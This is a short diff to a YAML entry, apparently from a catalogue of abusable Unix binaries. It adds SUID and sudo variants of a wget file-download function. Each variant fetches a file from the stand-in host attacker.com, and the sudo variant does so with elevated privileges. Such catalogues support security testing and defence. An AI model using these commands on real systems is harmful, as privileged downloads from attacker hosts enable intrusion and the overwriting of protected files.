@@ -12,4 +12,16 @@ functions:
         export URL=http://attacker.com/file_to_get
         export LFILE=file_to_save
         wget $URL -O $LFILE
+  suid-enabled:
+    - description: Fetch a remote file via HTTP GET request.
+      code: |
+        export URL=http://attacker.com/file_to_get
+        export LFILE=file_to_save
+        ./wget $URL -O $LFILE
+  sudo-enabled:
+    - description: Fetch a remote file via HTTP GET request.
+      code: |
+        export URL=http://attacker.com/file_to_get
+        export LFILE=file_to_save
+        sudo -E wget $URL -O $LFILE
 ---
